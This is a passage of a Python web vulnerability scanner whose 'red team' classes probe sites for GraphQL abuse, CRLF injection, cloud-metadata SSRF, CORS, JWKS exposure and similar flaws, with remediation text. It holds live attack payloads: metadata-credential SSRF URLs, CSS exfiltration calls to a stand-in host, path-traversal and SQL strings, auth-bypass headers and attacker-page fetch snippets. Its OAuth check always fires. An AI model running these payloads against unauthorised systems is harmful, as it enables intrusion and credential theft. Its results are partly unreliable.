            warn(f"  No security.txt found at {profile.host} — consider adding one (RFC 9116)")
            profile.findings.append(Finding(
                id="F-VDP-001", title="No security.txt / Vulnerability Disclosure Policy",
                severity="INFO", cwe="CWE-200", cvss=0.0,
                description="No security.txt file found. Researchers have no official contact for vulnerability reports.",
                evidence=f"Checked: {vdp_paths}",
                reproduction=f"curl -sk '{base}/.well-known/security.txt'",
                poc_curl=f"curl -sk '{base}/.well-known/security.txt'",
                category="VDP",
                remediation="Create /.well-known/security.txt per RFC 9116 with Contact: and Policy: fields."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 66-105 — 40 Advanced Red Team Skills (Phase 9)
# ══════════════════════════════════════════════════════════════

# ── Tool 66: GraphQL Batch / Alias DoS (SKILL-76) ────────────
class GraphQLBatchAttack:
    """Detect unbounded GraphQL batching, alias amplification, and query depth."""
    NAME = "GraphQL Batch Attack"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        gql_endpoints = ["/graphql", "/api/graphql", "/gql", "/query",
                         "/graphql/v1", "/v1/graphql", "/api/v1/graphql"]
        batch_payload = json.dumps([
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ]).encode()
        alias_payload = json.dumps({"query":
            " ".join(f"q{i}: __typename" for i in range(50))
        }).encode()
        depth_payload = json.dumps({"query":
            "{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }"
        }).encode()
        for ep in gql_endpoints:
            url = profile.url.rstrip("/") + ep
            for label, payload in [("batch", batch_payload), ("alias50", alias_payload), ("depth10", depth_payload)]:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", payload,
                               {"Content-Type": "application/json"})
                    if r and r.status < 500 and b"data" in (r.body or b""):
                        profile.findings.append(Finding(
                            id=f"GQL-BATCH-{label.upper()}",
                            title=f"GraphQL {label} not rejected",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-770",
                            description=f"GraphQL endpoint {ep} accepted {label} payload without restriction.",
                            poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{payload.decode()[:80]}...'",
                            category="GraphQL",
                            remediation="Enforce query depth/complexity limits and disable batching in production."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 67: Subresource Integrity Checker (SKILL-77) ─────────
class SRIChecker:
    """Detect CDN scripts/styles loaded without Subresource Integrity (SRI)."""
    NAME = "SRI Checker"
    CDN_PAT = re.compile(
        r'<(?:script|link)[^>]+(?:src|href)=["\']https?://(?!(?:www\.)?'
        r'(?:localhost|127\.0\.0\.1))[^"\']+["\'][^>]*>', re.I)
    SRI_PAT = re.compile(r'integrity=["\']sha', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r or not r.body:
            return profile
        body = r.body.decode("utf-8", errors="replace")
        for m in self.CDN_PAT.finditer(body):
            tag = m.group(0)
            if not self.SRI_PAT.search(tag):
                src = re.search(r'(?:src|href)=["\']([^"\']+)', tag, re.I)
                url_val = src.group(1) if src else tag[:60]
                profile.findings.append(Finding(
                    id="SRI-MISSING",
                    title="CDN resource loaded without SRI",
                    severity="LOW",
                    cvss=3.7,
                    cwe="CWE-494",
                    description=f"External resource loaded without integrity attribute: {url_val[:100]}",
                    poc_curl=f"curl -sk {profile.url} | grep -i 'cdn\\|cloudflare\\|jquery\\|bootstrap' | grep -v integrity",
                    category="Client-Side Security",
                    remediation="Add integrity='sha384-...' crossorigin='anonymous' to all third-party script/link tags."
                ))
        return profile

# ── Tool 68: postMessage Analyzer (SKILL-78) ──────────────────
class PostMessageAnalyzer:
    """Detect insecure postMessage origin validation in JavaScript."""
    NAME = "postMessage Analyzer"
    UNSAFE = re.compile(
        r'addEventListener\s*\(\s*["\']message["\'].*?(?:event\.data|e\.data)',
        re.S | re.I)
    ORIGIN_CHECK = re.compile(r'event\.origin|e\.origin|message\.origin', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r or not r.body:
            return profile
        body = r.body.decode("utf-8", errors="replace")
        js_urls = list(dict.fromkeys(
            re.findall(r'(?:src)=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.I)[:8]))
        for js_url in js_urls:
            abs_url = js_url if js_url.startswith("http") else profile.url.rstrip("/") + "/" + js_url.lstrip("/")
            try:
                rj = _fetch(abs_url, cfg.ua, cfg.timeout)
                if not rj or not rj.body:
                    continue
                src = rj.body.decode("utf-8", errors="replace")
                if self.UNSAFE.search(src) and not self.ORIGIN_CHECK.search(src):
                    profile.findings.append(Finding(
                        id="POSTMSG-NO-ORIGIN",
                        title="postMessage handler missing origin check",
                        severity="MEDIUM",
                        cvss=6.1,
                        cwe="CWE-346",
                        description=f"JavaScript file {abs_url[:80]} uses postMessage listener without validating event.origin.",
                        poc_curl=f"# In attacker page: window.open('{profile.url}').postMessage('{{\"action\":\"admin\"}}','*')",
                        category="Client-Side Security",
                        remediation="Always validate event.origin against an allowlist before processing postMessage data."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 69: Web Cache Deception (SKILL-79) ──────────────────
class WebCacheDeception:
    """Test for web cache deception via static-extension path confusion."""
    NAME = "Web Cache Deception"
    EXTS = [".css", ".jpg", ".png", ".js", ".woff2"]
    ACCT_PATHS = ["/account", "/profile", "/dashboard", "/me",
                  "/api/me", "/api/profile", "/api/user/me"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for acct in self.ACCT_PATHS:
            for ext in self.EXTS[:3]:
                url = profile.url.rstrip("/") + acct + ext
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    cc = r.headers.get("cache-control", "")
                    via = r.headers.get("via", "") + r.headers.get("x-cache", "")
                    if r.status == 200 and ("public" in cc or "HIT" in via.upper()):
                        profile.findings.append(Finding(
                            id="WCD-ACCOUNT",
                            title="Web Cache Deception — account page cached with static extension",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-525",
                            description=f"Authenticated endpoint {url} served as cached response (Cache-Control: {cc}). Attacker can trick victim into visiting this URL then retrieve cached sensitive data.",
                            poc_curl=f"curl -sk '{url}' -H 'Cookie: session=VICTIM_TOKEN'",
                            category="Cache",
                            remediation="Set Cache-Control: no-store on all authenticated endpoints. Use path-based cache rules."
                        ))
                except Exception:
                    pass
        return profile

# ── Tool 70: Service Worker Audit (SKILL-80) ─────────────────
class ServiceWorkerAudit:
    """Check for insecure service worker scope, stale cache, and fetch hijack."""
    NAME = "Service Worker Audit"
    SW_PATHS = ["/sw.js", "/service-worker.js", "/worker.js",
                "/js/sw.js", "/static/sw.js", "/app/sw.js"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SW_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                issues = []
                if "fetch" in body and "credentials" in body:
                    issues.append("forwards credentials in fetch")
                if re.search(r'scope\s*[:=]\s*["\']/', body):
                    issues.append("root-scope registration")
                if "importScripts" in body:
                    ext_scripts = re.findall(r'importScripts\(["\']([^"\']+)["\']', body)
                    for s in ext_scripts:
                        if not profile.host in s:
                            issues.append(f"imports external script: {s[:60]}")
                if issues:
                    profile.findings.append(Finding(
                        id="SW-SECURITY",
                        title=f"Insecure service worker: {', '.join(issues[:2])}",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-693",
                        description=f"Service worker at {url}: {'; '.join(issues)}",
                        poc_curl=f"curl -sk {url} | grep -E 'importScripts|credentials|scope'",
                        category="Client-Side Security",
                        remediation="Restrict SW scope, avoid root-scope, remove credential forwarding, only import same-origin scripts."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 71: HTTP Response Splitting / CRLF (SKILL-81) ────────
class CRLFInjectionScanner:
    """Test for CRLF injection in redirect and header-setting parameters."""
    NAME = "CRLF Injection Scanner"
    PAYLOADS = [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected:%20crlf-test",
        "%0d%0a%20X-Injected:%20crlf",
        "\r\nX-Injected: crlf-test",
        "%E5%98%8A%E5%98%8DX-Injected:%20crlf",
    ]
    PARAMS = ["redirect", "url", "next", "return", "returnUrl", "continue",
              "dest", "destination", "location", "target", "to", "r"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:6]:
            for pl in self.PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and "x-injected" in r.headers:
                        profile.findings.append(Finding(
                            id="CRLF-INJECT",
                            title="CRLF injection in HTTP response headers",
                            severity="HIGH",
                            cvss=7.2,
                            cwe="CWE-93",
                            description=f"Parameter '{param}' reflects CRLF sequence, allowing header injection. Injected header 'X-Injected' appeared in response.",
                            poc_curl=f"curl -sk -v '{url}' 2>&1 | grep -i 'x-injected'",
                            category="Injection",
                            remediation="Strip CR/LF characters from all parameters used in Location, Set-Cookie, or any header context."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 72: SAML Vulnerability Scanner (SKILL-82) ────────────
class SAMLVulnScanner:
    """Detect SAML misconfiguration: XML signature wrapping, XXE, replay potential."""
    NAME = "SAML Vulnerability Scanner"
    SAML_PATHS = ["/saml/login", "/saml/sso", "/sso/saml", "/auth/saml",
                  "/api/auth/saml", "/saml/consume", "/saml/acs",
                  "/saml2/login", "/saml2/sso"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SAML_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                if r.status in (200, 302, 400, 405, 422):
                    profile.findings.append(Finding(
                        id="SAML-ENDPOINT",
                        title=f"SAML endpoint exposed: {path}",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-287",
                        description=f"SAML endpoint {url} responded with HTTP {r.status}. Requires manual testing for XML signature wrapping (XSW), XXE, and assertion replay.",
                        poc_curl=f"curl -sk -X POST {url} -d 'SAMLResponse=BASE64_ENCODED_ASSERTION'",
                        category="Authentication",
                        remediation="Validate SAML signature before processing assertions. Disable XXE in XML parser. Enforce one-time-use with InResponseTo tracking."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 73: OAuth2 Implicit Flow Detector (SKILL-83) ─────────
class OAuth2ImplicitFlow:
    """Detect OAuth2 implicit flow (token in URL fragment) and missing PKCE."""
    NAME = "OAuth2 Implicit Flow"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        oauth_paths = ["/oauth/authorize", "/oauth2/authorize",
                       "/auth/oauth", "/connect/authorize",
                       "/api/oauth/authorize", "/.well-known/oauth-authorization-server"]
        for path in oauth_paths:
            url = profile.url.rstrip("/") + path
            probe = url + "?response_type=token&client_id=test&redirect_uri=http://localhost&scope=openid"
            try:
                r = _fetch(probe, cfg.ua, cfg.timeout)
                if not r:
                    continue
                if r.status in (200, 302, 400):
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    loc = r.headers.get("location", "")
                    if "response_type" in probe.lower() or "access_token" in loc:
                        profile.findings.append(Finding(
                            id="OAUTH-IMPLICIT",
                            title="OAuth2 implicit flow (response_type=token) accepted",
                            severity="HIGH",
                            cvss=7.4,
                            cwe="CWE-522",
                            description=f"OAuth2 endpoint {path} accepted response_type=token (implicit flow). Access tokens in URL fragments are logged in browser history and Referer headers.",
                            poc_curl=f"curl -sk '{probe}'",
                            category="OAuth",
                            remediation="Disable implicit flow. Use authorization_code + PKCE (RFC 7636). Reject response_type=token requests."
                        ))
            except Exception:
                pass
        return profile

# ── Tool 74: Virtual Host Fuzzer (SKILL-84) ──────────────────
class VHostFuzzer:
    """Fuzz Host header for hidden virtual hosts returning different content."""
    NAME = "VHost Fuzzer"
    PROBE_HOSTS = ["admin", "internal", "dev", "staging", "api", "backend",
                   "test", "beta", "portal", "dashboard", "manage", "private"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Get baseline with real host
        baseline = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not baseline:
            return profile
        base_len = len(baseline.body or b"")
        base_status = baseline.status
        apex = profile.apex
        for sub in self.PROBE_HOSTS:
            vhost = f"{sub}.{apex}"
            try:
                r = _fetch(profile.url, cfg.ua, cfg.timeout,
                           headers_extra={"Host": vhost})
                if not r:
                    continue
                diff = abs(len(r.body or b"") - base_len)
                if r.status != base_status or diff > 200:
                    profile.findings.append(Finding(
                        id=f"VHOST-{sub.upper()}",
                        title=f"Virtual host '{vhost}' returns different response",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-284",
                        description=f"Host header fuzzing with '{vhost}' produced status {r.status} (baseline {base_status}), body diff {diff} bytes.",
                        poc_curl=f"curl -sk {profile.url} -H 'Host: {vhost}'",
                        category="Recon",
                        remediation="Validate and whitelist accepted Host header values. Return 421 for unrecognised virtual hosts."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 75: Race Condition Tester (SKILL-85) ────────────────
class RaceConditionTester:
    """Detect race condition windows on state-changing endpoints."""
    NAME = "Race Condition Tester"
    RACE_PATHS = ["/api/coupon/apply", "/api/redeem", "/api/transfer",
                  "/api/withdraw", "/api/vote", "/api/like",
                  "/api/checkout", "/api/order"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import threading
        results = []
        def probe(url):
            try:
                r = _fetch(url, cfg.ua, 5)
                if r:
                    results.append(r.status)
            except Exception:
                pass
        for path in self.RACE_PATHS:
            url = profile.url.rstrip("/") + path
            results.clear()
            threads = [threading.Thread(target=probe, args=(url,)) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=6)
            if len(set(results)) > 1 and 200 in results:
                profile.findings.append(Finding(
                    id=f"RACE-{path.replace('/','_').upper()[:20]}",
                    title=f"Potential race condition window on {path}",
                    severity="HIGH",
                    cvss=7.5,
                    cwe="CWE-362",
                    description=f"5 simultaneous requests to {path} produced mixed responses: {set(results)}. May allow double-spend or privilege escalation.",
                    poc_curl="\n".join([f"curl -sk -X POST {url} &" for _ in range(5)] + ["wait"]),
                    category="Business Logic",
                    remediation="Use database transactions with row-level locking. Implement idempotency keys on sensitive endpoints."
                ))
        return profile

# ── Tool 76: Token Leakage Scanner (SKILL-86) ─────────────────
class TokenLeakageScanner:
    """Detect auth tokens leaking in URLs, Referer headers, and JS globals."""
    NAME = "Token Leakage Scanner"
    TOKEN_PAT = re.compile(
        r'(?:token|access_token|api_key|apikey|auth|bearer|jwt|session)'
        r'\s*[=:]\s*["\']?([A-Za-z0-9\-_\.]{20,})', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r:
            return profile
        # Check if tokens appear in Location redirect URL
        loc = r.headers.get("location", "")
        if self.TOKEN_PAT.search(loc):
            profile.findings.append(Finding(
                id="TOKEN-LEAK-REDIRECT",
                title="Auth token exposed in redirect URL",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-598",
                description=f"Location header contains token-like value: {loc[:100]}",
                poc_curl=f"curl -sk -v {profile.url} 2>&1 | grep -i 'location'",
                category="Authentication",
                remediation="Never pass tokens in URL parameters. Use POST body or HTTP headers for token exchange."
            ))
        # Check HTML body for inline tokens
        body = r.body.decode("utf-8", errors="replace") if r.body else ""
        for m in self.TOKEN_PAT.finditer(body):
            val = m.group(1)[:40]
            profile.findings.append(Finding(
                id="TOKEN-LEAK-BODY",
                title="Auth token/credential exposed in page body",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-312",
                description=f"Sensitive value found in response body near '{m.group(0)[:60]}'",
                poc_curl=f"curl -sk {profile.url} | grep -iE 'token|api_key|bearer'",
                category="Authentication",
                remediation="Remove credentials from HTML/JS. Use httpOnly cookies or Authorization header flow."
            ))
            break
        return profile

# ── Tool 77: Cloud Metadata SSRF (SKILL-87) ──────────────────
class CloudMetadataSSRF:
    """Generate SSRF payloads targeting cloud metadata endpoints."""
    NAME = "Cloud Metadata SSRF"
    META_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://fd00:ec2::254/latest/meta-data/",
    ]
    SSRF_PARAMS = ["url", "src", "image", "path", "proxy", "fetch",
                   "redirect", "uri", "href", "resource", "load"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.SSRF_PARAMS[:5]:
            for meta_url in self.META_URLS[:3]:
                probe = profile.url.rstrip("/") + f"/?{param}={meta_url}"
                try:
                    r = _fetch(probe, cfg.ua, 8)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if any(k in body for k in ["ami-id", "instance-id", "security-credentials",
                                                    "computeMetadata", "subscriptionId"]):
                            profile.findings.append(Finding(
                                id="SSRF-CLOUD-META",
                                title="SSRF reaching cloud metadata endpoint",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-918",
                                description=f"Parameter '{param}' fetched cloud metadata from {meta_url}. Response contains IAM/instance data.",
                                poc_curl=f"curl -sk '{probe}'",
                                category="SSRF",
                                remediation="Block IMDS IP ranges in egress firewall. Use IMDSv2 with PUT-based token. Validate/whitelist SSRF targets."
                            ))
                            return profile
                except Exception:
                    pass
        # Issue informational PoC list regardless
        profile.findings.append(Finding(
            id="SSRF-META-PROBE",
            title="Cloud metadata SSRF payloads generated (manual verification required)",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-918",
            description="SSRF parameters probed for cloud metadata leakage. No confirmed hit in automated scan — manual verification needed with burp collaborator.",
            poc_curl="\n".join(f"curl -sk '{profile.url.rstrip('/')}/?url={u}'" for u in self.META_URLS),
            category="SSRF",
            remediation="Implement SSRF allowlist. Block RFC1918 + 169.254.0.0/16 ranges in outbound requests."
        ))
        return profile

# ── Tool 78: ETag Inode Leakage (SKILL-88) ────────────────────
class ETagLeakage:
    """Detect Apache-style ETag headers exposing inode numbers."""
    NAME = "ETag Leakage"
    INODE_PAT = re.compile(r'^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in ["/", "/index.html", "/robots.txt", "/favicon.ico"]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                etag = r.headers.get("etag", "").strip('"')
                if etag and self.INODE_PAT.match(etag):
                    parts = etag.split("-")
                    if len(parts) == 3:
                        profile.findings.append(Finding(
                            id="ETAG-INODE",
                            title="Apache ETag exposes inode number",
                            severity="LOW",
                            cvss=3.7,
                            cwe="CWE-200",
                            description=f"ETag '{etag}' at {url} matches Apache inode-size-mtime format. Inode: {int(parts[0],16)}",
                            poc_curl=f"curl -sk -I {url} | grep -i etag",
                            category="Information Disclosure",
                            remediation="Set FileETag MTime Size in Apache config to remove inode from ETag. Or use FileETag None and custom ETags."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 79: API Auth Bypass via Headers (SKILL-89) ──────────
class APIAuthBypassHeaders:
    """Test for auth bypass via X-Auth-User, X-Remote-User, X-Forwarded-User headers."""
    NAME = "API Auth Bypass Headers"
    BYPASS_HEADERS = [
        {"X-Auth-User": "admin"},
        {"X-Remote-User": "admin"},
        {"X-Forwarded-User": "admin"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-WAP-Profile": "http://127.0.0.1/wap"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
    ]
    ADMIN_PATHS = ["/admin", "/api/admin", "/management", "/internal",
                   "/api/internal", "/private", "/api/private"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.ADMIN_PATHS[:4]:
            base_url = profile.url.rstrip("/") + path
            try:
                baseline = _fetch(base_url, cfg.ua, cfg.timeout)
                if not baseline or baseline.status not in (401, 403):
                    continue
            except Exception:
                continue
            for hdrs in self.BYPASS_HEADERS:
                try:
                    r = _fetch(base_url, cfg.ua, cfg.timeout, headers_extra=hdrs)
                    if r and r.status not in (401, 403, 404):
                        hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
                        profile.findings.append(Finding(
                            id=f"AUTH-BYPASS-HDR",
                            title=f"Auth bypass via header: {hdr_str}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-290",
                            description=f"Path {path} returned HTTP {r.status} with header {hdr_str}, bypassing 401/403 restriction.",
                            poc_curl=f"curl -sk {base_url} -H '{list(hdrs.keys())[0]}: {list(hdrs.values())[0]}'",
                            category="Access Control",
                            remediation="Never use untrusted client headers for authentication. Strip all X-Auth-* headers at the load balancer."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 80: Path Parameter Injection (SKILL-90) ─────────────
class PathParameterInjection:
    """Inject into REST path parameters for IDOR, traversal, and type confusion."""
    NAME = "Path Parameter Injection"
    ID_PAT = re.compile(r'/(\d{1,10})(?:/|$)')
    INJECT = ["0", "-1", "null", "undefined", "true", "%00", "../../etc/passwd",
              "1 OR 1=1", "1; DROP TABLE users--", "99999999999999"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        if not profile.js_endpoints:
            return profile
        tested = set()
        for ep in list(profile.js_endpoints)[:20]:
            m = self.ID_PAT.search(ep)
            if not m:
                continue
            base = ep[:m.start(1)]
            suffix = ep[m.end(1):]
            for val in self.INJECT[:5]:
                url = profile.url.rstrip("/") + base + val + suffix
                if url in tested:
                    continue
                tested.add(url)
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if r.status == 200 and any(k in body for k in ["root:", "SELECT", "error", "exception"]):
                        profile.findings.append(Finding(
                            id="PATH-PARAM-INJECT",
                            title=f"Path parameter injection on {base}{{id}}{suffix}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-20",
                            description=f"Path parameter value '{val}' produced unexpected 200 with suspicious content at {url[:80]}",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Validate path parameters: enforce type (integer), range, and existence checks before processing."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 81: HTTP Trace XST (SKILL-91) ───────────────────────
class HTTPTraceXST:
    """Detect Cross-Site Tracing (XST) via TRACE method + HttpOnly cookie reflection."""
    NAME = "HTTP Trace XST"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        url = profile.url
        try:
            r = _fetch(url, cfg.ua, cfg.timeout, "TRACE",
                       headers_extra={"X-Custom-Header": "xst-probe-12345"})
            if not r:
                return profile
            body = r.body.decode("utf-8", errors="replace") if r.body else ""
            if r.status == 200 and "xst-probe-12345" in body:
                profile.findings.append(Finding(
                    id="XST-TRACE",
                    title="TRACE method enabled — Cross-Site Tracing (XST) possible",
                    severity="LOW",
                    cvss=4.3,
                    cwe="CWE-16",
                    description="TRACE method is enabled and reflects request headers including custom values. Combined with XSS this allows HttpOnly cookie theft.",
                    poc_curl=f"curl -sk -X TRACE {url} -H 'X-Custom-Header: test'",
                    category="HTTP Methods",
                    remediation="Disable TRACE method on all HTTP servers. Add 'TraceEnable Off' (Apache) or 'if ($request_method = TRACE)' deny (nginx)."
                ))
        except Exception:
            pass
        return profile

# ── Tool 82: CSS Injection / Exfiltration (SKILL-92) ─────────
class CSSInjectionScanner:
    """Detect CSS injection via unescaped values in style attributes or CSS endpoints."""
    NAME = "CSS Injection Scanner"
    CSS_PAY = [
        "}</style><style>*{background:url(//x.x/css?leak=",
        "');background:url(//x.x/?l=",
        "-moz-binding:url(//x.x/xss.xml#xss)",
        "expression(alert(1))",
        "\\:expression(alert(1))",
    ]
    CSS_PARAMS = ["color", "theme", "style", "css", "bg", "background",
                  "class", "font", "skin", "layout"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.CSS_PARAMS[:5]:
            for pl in self.CSS_PAY[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if any(pl_part in body for pl_part in ["expression(", "-moz-binding", "url(//x.x"]):
                        profile.findings.append(Finding(
                            id="CSS-INJECT",
                            title=f"CSS injection via parameter '{param}'",
                            severity="MEDIUM",
                            cvss=6.1,
                            cwe="CWE-74",
                            description=f"Parameter '{param}' reflects CSS payload unescaped. Allows style injection, data exfiltration via attribute selectors.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Escape CSS special characters. Use a strict CSS allowlist for user-controlled values. Implement CSP."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 83: CORS Credential Exposure (SKILL-93) ─────────────
class CORSCredentialExposure:
    """Test for CORS misconfiguration with credentials: include + wildcard/reflected origin."""
    NAME = "CORS Credential Exposure"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/me", "/api/user", "/api/profile",
                     "/api/v1/user", "/api/v2/user", "/api/account", profile.url]
        evil_origin = "https://evil.example.com"
        for path in api_paths[:5]:
            url = path if path.startswith("http") else profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout,
                           headers_extra={"Origin": evil_origin,
                                          "Cookie": "test=probe"})
                if not r:
                    continue
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")
                if ("true" in acac.lower()) and (acao == evil_origin or acao == "*"):
                    profile.findings.append(Finding(
                        id="CORS-CRED-EXPOSE",
                        title="CORS allows credentials from arbitrary origin",
                        severity="CRITICAL",
                        cvss=9.3,
                        cwe="CWE-942",
                        description=f"Endpoint {url} responds with ACAO: {acao} and ACAC: {acac}. Any origin can make credentialed cross-origin requests.",
                        poc_curl=(
                            f"# Attacker page JS:\n"
                            f"fetch('{url}', {{credentials:'include'}}).then(r=>r.text()).then(console.log)"
                        ),
                        category="CORS",
                        remediation="Never combine Access-Control-Allow-Credentials: true with a dynamically reflected or wildcard origin."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 84: Mass Assignment Fuzzer (SKILL-94) ───────────────
class MassAssignmentFuzzer:
    """Inject hidden privileged fields in JSON API requests."""
    NAME = "Mass Assignment Fuzzer"
    PRIV_FIELDS = [
        {"role": "admin"},
        {"is_admin": True},
        {"isAdmin": True},
        {"admin": True},
        {"user_type": "admin"},
        {"userType": "ADMIN"},
        {"permissions": ["admin", "root"]},
        {"privilege": "superuser"},
        {"balance": 999999},
        {"credit": 999999},
        {"verified": True},
        {"active": True},
        {"email_verified": True},
    ]
    ENDPOINTS = ["/api/user", "/api/profile", "/api/account",
                 "/api/register", "/api/v1/user", "/api/v2/user"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.ENDPOINTS[:4]:
            url = profile.url.rstrip("/") + ep
            for fields in self.PRIV_FIELDS[:5]:
                payload = json.dumps({"username": "testuser", "email": "test@test.com",
                                      "password": "Test1234!", **fields}).encode()
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", payload,
                               {"Content-Type": "application/json"})
                    if r and r.status in (200, 201):
                        body = r.body.decode("utf-8", errors="replace") if r.body else ""
                        key = list(fields.keys())[0]
                        if key in body or str(list(fields.values())[0]).lower() in body.lower():
                            profile.findings.append(Finding(
                                id="MASS-ASSIGN",
                                title=f"Mass assignment — privileged field '{key}' accepted",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-915",
                                description=f"POST {ep} accepted extra field '{key}': {fields[key]} and reflected it in the response body.",
                                poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{payload.decode()}'",
                                category="Access Control",
                                remediation="Use explicit allowlist (DTO/schema) for accepted fields. Block all unlisted properties at the model layer."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 85: JWT JWK Set URI Poisoning (SKILL-95) ─────────────
class JWKSPoisoning:
    """Detect JWT jku/x5u header injection and JWKS endpoint exposure."""
    NAME = "JWKS Poisoning"
    JWKS_PATHS = ["/.well-known/jwks.json", "/api/jwks", "/auth/jwks",
                  "/oauth/jwks", "/jwks.json", "/oauth2/v3/certs",
                  "/.well-known/openid-configuration"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.JWKS_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                if '"keys"' in body or '"kty"' in body or "issuer" in body:
                    has_alg_none = '"alg":"none"' in body or '"alg": "none"' in body
                    profile.findings.append(Finding(
                        id="JWKS-EXPOSED",
                        title=f"JWKS/OpenID configuration exposed at {path}",
                        severity="INFO" if not has_alg_none else "HIGH",
                        cvss=0.0 if not has_alg_none else 8.8,
                        cwe="CWE-522",
                        description=f"JWKS endpoint {url} is publicly accessible. Keys: {body[:100]}{'  *** alg:none found!' if has_alg_none else ''}",
                        poc_curl=f"curl -sk {url} | python3 -m json.tool",
                        category="Authentication",
